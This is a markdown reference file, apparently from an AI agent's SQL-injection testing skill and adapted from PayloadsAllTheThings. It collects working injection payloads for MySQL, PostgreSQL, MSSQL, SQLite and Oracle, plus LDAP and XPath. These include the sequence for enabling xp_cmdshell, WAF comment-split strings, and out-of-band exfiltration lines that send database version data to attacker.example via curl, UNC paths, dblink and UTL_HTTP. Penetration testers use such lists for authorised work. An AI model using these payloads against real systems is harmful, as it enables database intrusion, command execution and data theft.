---
description: Per-DBMS privilege gates for file and OS steps, DBMS fingerprinting, OOB extraction, SQLite time oracle, LDAP and XPath probes
skill: sqli-testing
source: PayloadsAllTheThings — SQL Injection
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# SQL Injection Payloads

> Source: PayloadsAllTheThings — SQL Injection

## File and OS Access — Privilege Gates

Check the privilege before spending requests on a file or OS step; most fail on the grant, not the
payload. File writes and OS commands change target state and need operator approval.

| DBMS | Step | Gate |
|------|------|------|
| MySQL | `LOAD_FILE()` read, `INTO OUTFILE` write | FILE privilege. `SELECT @@secure_file_priv`: `NULL` = file I/O disabled; a path (`/var/lib/mysql-files/`) = confined to that directory; empty = unrestricted. `INTO OUTFILE` is double-gated: FILE plus a writable web-served directory. |
| MySQL | OS command via UDF | Write a `.so`/`.dll` into `plugin_dir` plus `CREATE FUNCTION` (INSERT on `mysql.func`). Rarely possible; never on managed MySQL. |
| PostgreSQL | `pg_read_file()`, `COPY … FROM '<file>'` | Superuser or `pg_read_server_files`. |
| PostgreSQL | `COPY … TO '<file>'` | Superuser or `pg_write_server_files`. |
| PostgreSQL | `COPY … TO PROGRAM '<cmd>'` | Superuser or `pg_execute_server_program`; disabled on RDS and Cloud SQL. |
| MSSQL | `OPENROWSET(BULK '<file>', SINGLE_CLOB)` | ADMINISTER BULK OPERATIONS; rare on modern installs. |
| MSSQL | `xp_cmdshell` | Off by default; re-enabling needs sysadmin: `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`. Absent on Azure SQL Database. |
| Managed (RDS, Aurora, Cloud SQL, Azure SQL) | any file/OS step | FILE is never granted and OS access is blocked: go for data extraction → credentials in application tables instead. |

Cross-database reach is the usual Critical path: `information_schema.schemata` (MySQL) or
`master..sysdatabases` (MSSQL) lists co-hosted databases, and a shared multi-tenant database means
one injection reaches every tenant.

## WAF Bypass Techniques

### Comment-Splitting (legacy — rarely effective against modern WAFs)

Every default ruleset on Cloudflare/AWS WAF/Akamai signature-matches this split (the shapes that
still pass are in `agent/references/web/waf-bypass-and-safe-testing.md` §E); do not spend engagement
time on it as a bypass. Kept here as raw syntax that is still useful against an
unpatched target or a request path with no WAF in front of it:

```sql
1/*comment*/AND/**/1=1/**/--
1/*!12345UNION*//*!12345SELECT*/1--
1'/*!50000UNION*/ /*!50000SELECT*/ 1,2,version()--
```

## DBMS Fingerprinting

```sql
-- MySQL
conv('a',16,2)=conv('a',16,2)
connection_id()=connection_id()

-- MSSQL
@@CONNECTIONS=@@CONNECTIONS

-- PostgreSQL
5::int=5
pg_client_encoding()=pg_client_encoding()

-- SQLite
sqlite_version()=sqlite_version()

-- Oracle
ROWNUM=ROWNUM
```

## Blind Injection — Time-Based

```sql
-- SQLite (no native sleep — use heavy computation or boolean)
' AND CASE WHEN 1=1 THEN randomblob(500000000) ELSE 0 END--
```

## NoSQL Injection

See `nosql-injection-payloads.md` for MongoDB operator injection, blind extraction, `$where` injection and WAF bypass.

## Out-of-Band (OOB) Extraction

```sql
-- MySQL (requires FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.example\\share'))--

-- MSSQL (xp_dirtree / xp_fileexist)
'; EXEC master..xp_dirtree '\\attacker.example\share'--
'; EXEC master..xp_fileexist '\\attacker.example\share'--

-- PostgreSQL (COPY / dblink)
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.example/?v='||version()--
-- Requires dblink extension:
'; SELECT dblink_send_query('host=attacker.example dbname=x','SELECT version()')--

-- Oracle (UTL_HTTP / UTL_INADDR)
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.example/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM DUAL--
```

## LDAP Injection

```
*
)(cn=*
*)(uid=*))(|(uid=*
admin)(&)
admin)(|(password=*))
```

- Test in login forms with wildcard and filter manipulation payloads
- Auth bypass: close existing filter and inject always-true conditions
- Information disclosure via wildcard queries against directory attributes

## XPath Injection

```
' or '1'='1
' or ''='
' or name()='username
```

- Test in XML-backed search and login endpoints
- Extract data iteratively: `' or name()='<fieldname>` to enumerate node names
